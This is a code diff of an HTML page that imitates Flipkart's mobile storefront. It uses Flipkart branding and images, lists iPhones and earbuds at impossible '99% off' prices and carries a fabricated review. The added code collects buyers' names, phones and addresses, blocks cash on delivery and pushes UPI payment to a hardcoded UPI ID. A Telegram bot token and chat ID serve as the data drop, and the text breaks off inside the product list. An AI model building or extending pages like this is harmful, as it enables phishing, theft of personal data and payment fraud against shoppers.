@@ -9,16 +9,21 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
-        body { font-family: 'Roboto', sans-serif; background-color: #f1f3f6; margin: 0; }
+        body { font-family: 'Roboto', sans-serif; background-color: #f1f3f6; margin: 0; overflow-x: hidden; }
         .fk-blue { background-color: #2874f0; }
-        .btn-orange { background: #fb641b; color: #fff; border-radius: 2px; }
-        .btn-yellow { background: #ff9f00; color: #fff; border-radius: 2px; }
+        .btn-orange { background: #fb641b; color: #fff; border-radius: 2px; font-weight: bold; }
+        .btn-yellow { background: #ff9f00; color: #fff; border-radius: 2px; font-weight: bold; }
         .rating-badge { background: #388e3c; color: #fff; padding: 2px 6px; border-radius: 3px; font-weight: bold; font-size: 11px; }
-        .line-input { width: 100%; border-bottom: 2px solid #e0e0e0; padding: 10px 0; outline: none; transition: 0.3s; font-size: 14px; background: transparent; }
-        .line-input:focus { border-bottom-color: #2874f0; }
-        .category-scroll::-webkit-scrollbar { display: none; }
-        .banner-swiper { height: 160px; }
-        .banner-swiper img { width: 100%; height: 100%; object-fit: fill; }
+        .line-input { width: 100%; border-bottom: 2px solid #ccc; padding: 12px 0; outline: none; background: transparent; }
+        
+        /* Home Banner Swiper */
+        .home-swiper { width: 100%; height: 180px; }
+        .home-swiper img { width: 290%; height: 100%; object-fit: cover; }
+        
+        /* Detail Page Image Stack */
+        .detail-swiper { height: 320px; width: 100%; background: white; }
+        .detail-swiper img { width: 100%; height: 100%; object-fit: contain; }
+        .full-stack img { width: 100%; height: auto; margin-bottom: 4px; border-bottom: 1px solid #eee; }
     </style>
 </head>
 <body>
@@ -29,98 +34,134 @@
                 <i class="fa-solid fa-bars text-white text-lg"></i>
                 <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fkheaderlogo_exploreplus_mobile-f4d035.svg" class="h-5">
             </div>
-            <div class="flex gap-4 text-white items-center">
-                <i class="fa-solid fa-bell"></i>
-                <i class="fa-solid fa-cart-shopping"></i>
-            </div>
+            <i class="fa-solid fa-cart-shopping text-white"></i>
         </header>
 
-        <div class="fk-blue px-4 pb-3">
-            <div class="bg-white rounded-sm flex items-center px-3 py-2 text-gray-400 gap-2">
-                <i class="fa-solid fa-magnifying-glass"></i>
-                <span class="text-sm">Search for products</span>
+        <div class="fk-blue px-4 pb-3 sticky top-[44px] z-[90]">
+            <div class="bg-white rounded-sm flex items-center px-3 py-2 text-gray-400 gap-2 shadow-inner">
+                <i class="fa-solid fa-magnifying-glass text-xs"></i>
+                <input type="text" id="searchInput" oninput="searchProduct()" placeholder="Search for products, brands and more" class="text-sm w-full outline-none text-black">
             </div>
         </div>
 
-        <div class="swiper banner-swiper mt-1">
+        <div class="swiper home-swiper">
             <div class="swiper-wrapper">
-                <div class="swiper-slide"><img src="https://rukminim1.flixcart.com/fk-p-flap/3200/540/image/7be563256301e160.jpg?q=60"></div>
-                <div class="swiper-slide"><img src="https://rukminim1.flixcart.com/fk-p-flap/3200/540/image/5b309e98775e22e4.jpg?q=60"></div>
+                <div class="swiper-slide"><img src="https://rukminim1.flixcart.com/fk-p-flap/3240/540/image/95a49a17583a0ae7.jpg?q=60"></div>
+                <div class="swiper-slide"><img src="https://rukminim1.flixcart.com/fk-p-flap/3240/540/image/7be563256301e160.jpg?q=60"></div>
+                <div class="swiper-slide"><img src="https://rukminim1.flixcart.com/fk-p-flap/3200/700/image/023aa060cf896d38.jpg?q=60"></div>
             </div>
             <div class="swiper-pagination"></div>
         </div>
 
-        <div class="p-3 bg-white mt-1 font-bold">Deals of the Day</div>
-        <main id="main-grid" class="p-2 grid grid-cols-2 gap-2 pb-20"></main>
+        <div class="bg-white p-3 shadow-sm font-bold text-gray-700 flex justify-between items-center">
+            <span>Special Deals</span>
+            <span class="text-xs fk-blue text-white px-2 py-1 rounded">View All</span>
+        </div>
+        
+        <main id="main-grid" class="grid grid-cols-2 gap-1 p-1 pb-20"></main>
     </div>
 
-    <div id="page-detail" class="hidden fixed inset-0 bg-white z-[200] overflow-y-auto">
-        <nav class="p-3 border-b sticky top-0 bg-white z-[210] flex items-center gap-4">
+    <div id="page-detail" class="hidden fixed inset-0 bg-[#f1f3f6] z-[200] overflow-y-auto">
+        <nav class="p-3 border-b sticky top-0 bg-white z-[210] flex items-center gap-4 shadow-sm">
             <i class="fa-solid fa-arrow-left text-xl" onclick="showPage('page-home')"></i>
-            <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/flipkart-plus_8d85f4.png" class="h-4">
+            <span class="font-bold">Details</span>
         </nav>
-        
-        <div class="swiper detailSwiper h-72 bg-white">
-            <div class="swiper-wrapper" id="detail-img-wrapper"></div>
-            <div class="swiper-pagination"></div>
-        </div>
 
-        <div class="p-4 bg-white">
-            <p id="det-name" class="text-sm font-medium"></p>
-            <div class="flex items-center gap-2 mt-1">
-                <span class="rating-badge">4.6 ★</span>
-                <span class="text-gray-400 text-xs underline">1,24,510 Ratings</span>
-            </div>
+        <div class="swiper detail-swiper"><div class="swiper-wrapper" id="swiper-images"></div><div class="swiper-pagination"></div></div>
+
+        <div class="p-4 bg-white border-b">
+            <p id="det-name" class="text-lg font-medium text-gray-800 leading-tight"></p>
             <div class="flex items-baseline gap-2 mt-2">
-                <span id="det-price" class="text-2xl font-bold text-black"></span>
+                <span id="det-price" class="text-3xl font-bold"></span>
                 <span class="text-green-600 font-bold text-sm">99% off</span>
             </div>
         </div>
 
-        <div class="p-4 bg-white mt-2 pb-24 border-t">
-            <h3 class="font-bold mb-3">Recent Reviews</h3>
-            <div id="reviews-container" class="space-y-4 text-sm"></div>
+        <div class="p-4 bg-white mt-2 border-b">
+            <h3 class="font-bold mb-3 text-sm uppercase text-gray-400 tracking-wider">Ratings & Reviews</h3>
+            <div class="border p-3 rounded-md bg-gray-50">
+                <div class="flex items-center gap-2 mb-1">
+                    <span class="rating-badge">5 ★</span> <span class="font-bold text-sm">Mind-blowing!</span>
+                </div>
+                <p class="text-gray-500 text-xs italic">Reviewed in India on 3 January 2026</p>
+                <p class="text-gray-600 text-sm mt-1">Excellent product. I got it at very low price during sale.</p>
+            </div>
         </div>
 
-        <div class="fixed bottom-0 w-full flex h-14 bg-white border-t z-[220]">
-            <button class="w-1/2 font-bold text-sm uppercase">Add to Cart</button>
-            <button onclick="showPage('page-address')" class="w-1/2 btn-yellow font-bold text-sm uppercase">Buy Now</button>
+        <div class="mt-2 bg-white">
+            <p class="p-4 text-xs font-bold text-gray-400 uppercase">Product Description Photos</p>
+            <div id="full-stack-images" class="full-stack"></div>
+        </div>
+
+        <div class="fixed bottom-0 w-full flex h-14 bg-white border-t z-[220] p-2 gap-2">
+            <button class="w-1/2 font-bold text-sm border rounded">ADD TO CART</button>
+            <button onclick="showPage('page-address')" class="w-1/2 btn-yellow font-bold text-sm rounded">CONTINUE</button>
         </div>
     </div>
 
-    <div id="page-address" class="hidden fixed inset-0 bg-[#f1f3f6] z-[300] overflow-y-auto">
-        <nav class="fk-blue p-4 text-white flex items-center gap-4 sticky top-0">
+    <div id="page-address" class="hidden fixed inset-0 bg-white z-[300] overflow-y-auto">
+        <nav class="fk-blue p-4 text-white flex items-center gap-4">
             <i class="fa-solid fa-arrow-left" onclick="showPage('page-detail')"></i>
-            <span class="font-medium">Delivery Address</span>
+            <span class="font-medium">Add Delivery Address</span>
         </nav>
-        <div class="bg-white p-6 m-2 shadow-sm space-y-5">
-            <input type="text" id="uName" placeholder="Full Name*" class="line-input">
-            <input type="tel" id="uPhone" placeholder="Mobile Number*" class="line-input">
+        <div class="p-6 space-y-6">
+            <input type="text" id="uName" placeholder="Full Name (Required)*" class="line-input">
+            <input type="tel" id="uPhone" placeholder="Mobile Number (Required)*" class="line-input" maxlength="10">
+            
             <div class="relative">
-                <input type="number" id="uPin" placeholder="Pincode*" oninput="checkPincode(this.value)" class="line-input">
-                <span id="pin-loader" class="absolute right-0 top-3 text-[10px] text-blue-600 hidden italic">Fetching...</span>
+                <input type="number" id="uPin" placeholder="Pincode (Required)*" class="line-input" oninput="fetchPin(this.value)">
+                <span id="load" class="absolute right-0 bottom-3 text-xs text-blue-500 hidden italic">Locating...</span>
             </div>
+            
             <div class="flex gap-4">
-                <input type="text" id="uCity" placeholder="City/District" class="line-input bg-gray-50" readonly>
-                <input type="text" id="uState" placeholder="State" class="line-input bg-gray-50" readonly>
+                <input type="text" id="uCity" placeholder="City" class="line-input w-1/2 bg-gray-100" readonly>
+                <input type="text" id="uState" placeholder="State" class="line-input w-1/2 bg-gray-100" readonly>
             </div>
-            <input type="text" id="uHouse" placeholder="House No., Building Name*" class="line-input">
-            <button id="payBtn" onclick="sendToTelegram()" class="w-full btn-orange py-4 font-bold uppercase shadow-lg mt-4">Continue to Payment</button>
+            
+            <input id="uAdd" placeholder="House No, Building Name*" class="line-input">
+            <button onclick="goToPayment()" class="w-full btn-orange py-4 rounded shadow-lg uppercase">Save and Continue</button>
+        </div>
+    </div>
+
+    <div id="page-payment" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400] overflow-y-auto">
+        <nav class="fk-blue p-4 text-white flex items-center gap-4">
+            <i class="fa-solid fa-arrow-left" onclick="showPage('page-address')"></i>
+            <span class="font-medium">Payments</span>
+        </nav>
+        <div class="p-4">
+            <div class="bg-white p-4 rounded shadow-sm">
+                <p class="font-bold border-b pb-2 mb-4 text-xs text-gray-500 uppercase">Recommended Method</p>
+                <div class="space-y-6">
+                    <label class="flex items-center justify-between border-b pb-4">
+                        <div class="flex gap-4 items-center">
+                            <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-6 h-6">
+                            <span class="font-bold">UPI (PhonePe / GPay)</span>
+                        </div>
+                        <input type="radio" checked>
+                    </label>
+                    <div class="flex items-center justify-between opacity-30">
+                        <div class="flex gap-4 items-center">
+                            <i class="fa-solid fa-truck-fast text-xl text-gray-500"></i>
+                            <span class="font-bold">Cash on Delivery</span>
+                        </div>
+                        <span class="text-red-600 text-[10px] font-bold border border-red-500 px-1">NOT AVAILABLE</span>
+                    </div>
+                </div>
+            </div>
+            <button onclick="confirmPay()" class="w-full btn-orange py-4 mt-8 shadow-xl uppercase font-bold">Place Order & Pay</button>
         </div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
     <script>
-        // --- CONFIG ---
-        const BOT_TOKEN = "8327016009:AAH1igUPnQsuURjtmxxHqaAWTKS-haiO7jM"; // <-- Apna Token Dalein
-        const CHAT_ID = "1981500395"; // <-- Apni Chat ID Dalein
-        const MY_UPI_ID = "8709615634-w350@ybl"; 
-
-        let selectedProductPrice = 0;
-        let selectedProductName = "";
+        const BOT_TOKEN = "8327016009:AAH1igUPnQsuURjtmxxHqaAWTKS-haiO7jM";
+        const CHAT_ID = "1981500395";
+        const MY_UPI = "8709615634-w350@ybl";
 
         const products = [
-            { id: 201, name: "Apple iPhone 16 Pro Max (Desert Titanium)", price: 1440, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/800/800/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/s/4/b/-original-imahggex8m6jhazj.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/800/800/xif0q/mobile/s/q/r/-original-imahggessqugbgtn.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/u/i/p/-original-imahggexnszdzhgk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/z/w/h/-original-imahgges92z2z3z4.jpeg?q=70&crop=false"] },
+            { id: 1, name: "Apple iPhone 16 Pro Max (Desert Titanium, 256GB)", price: "1,440", imgs: ["https://rukminim2.flixcart.com/image/800/800/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/s/4/b/-original-imahggex8m6jhazj.jpeg", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/z/w/h/-original-imahgges92z2z3z4.jpeg"] },
+            { id: 2, name: "OnePlus Nord Buds 2r Wireless Earbuds", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/y/i/-original-imagr4t8mwhmtyg9.jpeg"] },
+          { id: 201, name: "Apple iPhone 16 Pro Max (Desert Titanium)", price: 1440, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/800/800/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/s/4/b/-original-imahggex8m6jhazj.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/i/z/y/-original-imahggevgnkffgfs.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/800/800/xif0q/mobile/s/q/r/-original-imahggessqugbgtn.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/u/i/p/-original-imahggexnszdzhgk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/z/w/h/-original-imahgges92z2z3z4.jpeg?q=70&crop=false"] },
             { id: 202, name: "Apple iPhone 15 Pro Max (Blue Titanium, 1 TB)", price: 1299, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/y/0/u/-original-imahggetzffhxaar.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/p/b/7/-original-imahggetywqjzwg6.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/100/xif0q/mobile/p/x/v/-original-imahgget2bnawe32.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/p/x/v/-original-imahgget2bnawe32.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/c/u/n/-original-imahggesm7x8cqpq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/f/v/q/-original-imahggeszfhzzguy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/o/d/u/-original-imahggeseyergyfm.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/3/3/m/-original-imahggespkyk86bh.jpeg?q=70&crop=false"] },
             { id: 223, name: "OnePlus Nord Buds 2r True Wireless in Ear Earbuds with Dual Mic & AI Crystal Clear Call Bluetooth  (Triple Blue, True Wireless)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/y/i/-original-imagr4t8mwhmtyg9.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/f/h/b/-original-imagr4t8ej6we279.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/k/p/y/-original-imagr4t8jmt4zsra.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/6/l/q/-original-imagr4t8dwxfutht.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/6/l/q/-original-imagr4t8dwxfutht.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/6/l/q/-original-imagr4t8dwxfutht.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/w/u/v/-original-imagr4t8urgsxjkg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/l/q/o/-original-imagr4t8fgj9afzc.jpeg?q=70&crop=false"] },
             { id: 104, name: "OnePlus Bullets Wireless Z2 Bluetooth  (Beam Blue, In the Ear)", price: 149, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/u/x/g/bullets-wireless-z2-bluetooth-oneplus-original-imahdt5jpffgzebs.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/x/f/a/bullets-wireless-z2-bluetooth-oneplus-original-imahdt5jmgmaep2g.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/j/6/o/bullets-wireless-z2-bluetooth-oneplus-original-imahdt5jzg63bvjf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/9/9/s/bullets-wireless-z2-bluetooth-oneplus-original-imahdt5jm36xjxve.jpeg?q=70&crop=false"] },
@@ -147,116 +188,93 @@
             { id: 127, name: "boAt Storm Infinity 15 Days Huge Battery(550 mAh) Fast Charge,1.83 (4.64cm) Display Smartwatch  (Deep Blue Strap, Free Size)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/8/w/z/-original-imahamwxdh7tgtzc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/o/o/n/-original-imahah5yyr8ffncb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/o/c/o/-original-imahah5yzaa7nwhb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/3/f/s/-original-imahah5yzgrxqrjd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/1/5/z/-original-imahah5ybehhnaxe.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/d/z/9/-original-imahah5ygb2gh7cj.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/5/t/v/-original-imahah5yvzy5qrbg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/k/s/z/-original-imahage7hzf7nba2.jpeg?q=70&crop=false"] },
             { id: 128, name: "ZEBRONICS ZEB-SBSPK C12 / ZEB-JUKE BAR 9551 625 W Bluetooth Soundbar  (Black, 5.2 Channel)", price: 209, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/p/o/l/-original-imahgbnqbhkewzyh.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/b/v/y/-original-imahgbnqhhh2tp4d.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/g/b/w/-original-imahgbnqygtkgwhf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/j/g/i/-original-imahgbnq5hwfzwvd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/b/y/7/-original-imahgbnqf2gwth8b.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/100/xif0q/speaker/6/e/x/-original-imahgbnqhw3cbagd.jpeg?q=70&crop=false"] },
             { id: 129, name: "boAt Chrome Endeavour,1.96 AMOLED Display,AI Coach Health Insights,HRV,VO2 Max,IP68 Smartwatch  (Active Black Strap, Free Size)", price: 299, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/f/n/e/-original-imahfuq4mvm5pacs.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/p/d/7/-original-imahfuq4f5u8xnxx.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/h/b/m/-original-imahfuq43gnjfmga.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/n/y/l/-original-imahfuq4sh9ytpzu.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/q/f/n/-original-imahfuq4ntzgc8r8.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/q/l/6/-original-imahfuq4cy8zunme.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/p/j/g/-original-imahfuq4nszdmnsq.jpeg?q=70&crop=false"] },
-            { id: 103, name: "GOBOULT Mustang Torq 60Hrs, App Support, 4Mic ENC, Breathable LED, 5.4v Bluetooth  (Yellow, True Wireless)", price: 249, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/w/o/d/-original-imahe5gmhgzz7csh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/r/6/s/-original-imahe5gmgzenfnya.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/w/1/w/-original-imahe5gmkfzgvfpk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/7/b/d/-original-imahe5gm96gffttk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/a/e/r/-original-imahe5gmfycerfjb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/l/o/h/-original-imahe5gmduuubwag.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/o/s/y/-original-imahe5gm3fjgzvyd.jpeg?q=70&crop=false"] },
-            { id: 101, name: "GOBOULT Drift 2, 15 days Battery life, 1.83'' HD Screen, 500Nits Brightness Smartwatch  (Sapphire Strap, Free Size)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/7/d/i/-original-imahfaswpwfdxyqv.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/h/a/0/-original-imahf9qjpcms7n9p.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/b/q/q/-original-imahf9qjba2bgyt6.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/n/a/x/-original-imahf9qjjhhhavmf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/y/e/l/-original-imahf9qjxykhkpvx.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/h/k/c/-original-imahf9qj95gzhuzx.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/o/k/r/-original-imahf9qjynp5njcy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/0/g/s/-original-imahf9qje4quyysu.jpeg?q=70&crop=false"] },
-            { id: 102, name: "Noise Aura Buds with Dual Device Pairing, 60 Hours of Playtime, and ENC with Quad Mic Bluetooth  (Aura White, True Wireless)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/f/f/r/-original-imagzzh2w3wzxuzt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/g/i/g/-original-imahyx2upujyhxkt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/j/8/d/-original-imahyx2u7uwk8guc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/e/y/g/-original-imahyx2u3cdj6bhr.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/t/u/i/-original-imahyx2urure8gbr.jpeg?q=70&crop=false"] },
-            { id: 103, name: "CMF by Nothing Buds 2 48 dB Hybrid ANC, Ultra Bass Technology 2.0, 55 Hrs playtime Bluetooth  (Orange, In the Ear)", price: 249, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/h/b/v/-original-imahe29hx7dunuvp.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/h/x/d/-original-imahe29hqvcvddzd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/r/j/x/-original-imahe29h8xspjvbf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/m/g/g/-original-imahe29h4afpdhmg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/3/x/m/-original-imahe29hgu3fus7s.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/3/i/m/-original-imahe29hbzec5d57.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/y/4/g/-original-imahe29hmcm3uanb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/a/l/e/-original-imahe29hrygagyeh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/p/y/1/-original-imahe29hggnxvyyx.jpeg?q=70&crop=false"] },
-            { id: 101, name: "realme Buds T200x with 25dB ANC,12.4mm Dynamic Bass Drivers,48Hrs Playback, BT5.4, IP55 Bluetooth  (Pure Black, True Wireless)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/s/a/i/-original-imahcyy3c5dyfgjt.jpeg?q=70&crop=false", "https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/s/b/j/-original-imahcyy3k5xymzzy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/g/8/y/-original-imahcyy3mh9qr7te.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/s/a/p/-original-imahcyy3cw3ehhva.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/t/h/2/-original-imahcyy3caqxhrvc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/e/i/p/-original-imahcyy3wv6hehzd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/q/t/v/-original-imahcyy3hf2teh4g.jpeg?q=70&crop=false"] },
-            { id: 102, name: "Samsung Galaxy S24 Ultra 5G", price: 1299, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/j/m/z/-original-imahgfmxumntk7sy.jpeg?q=70"] },
-            { id: 103, name: "AirPods Pro (2nd Generation)", price: 249, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/612/612/xif0q/headphone/p/v/f/-original-imagp9vsq2zyhuvv.jpeg?q=70"] },
-            { id: 101, name: "Apple iPhone 16 Pro Max (Desert Titanium)", price: 1440, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/b/f/5/-original-imahggexm5yafhez.jpeg?q=70", "https://rukminim2.flixcart.com/image/312/312/xif0q/mobile/5/i/7/-original-imahggexvthqz97h.jpeg?q=70"] },
+            { id: 130, name: "GOBOULT Mustang Torq 60Hrs, App Support, 4Mic ENC, Breathable LED, 5.4v Bluetooth  (Yellow, True Wireless)", price: 249, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/9/a/w/-original-imahe5gm9yszqgxc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/w/o/d/-original-imahe5gmhgzz7csh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/r/6/s/-original-imahe5gmgzenfnya.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/w/1/w/-original-imahe5gmkfzgvfpk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/7/b/d/-original-imahe5gm96gffttk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/a/e/r/-original-imahe5gmfycerfjb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/l/o/h/-original-imahe5gmduuubwag.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/o/s/y/-original-imahe5gm3fjgzvyd.jpeg?q=70&crop=false"] },
+            { id: 131, name: "GOBOULT Drift 2, 15 days Battery life, 1.83'' HD Screen, 500Nits Brightness Smartwatch  (Sapphire Strap, Free Size)", price: 199, cat: "electronics", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/7/d/i/-original-imahfaswpwfdxyqv.jpeg?q=70&crop=false", 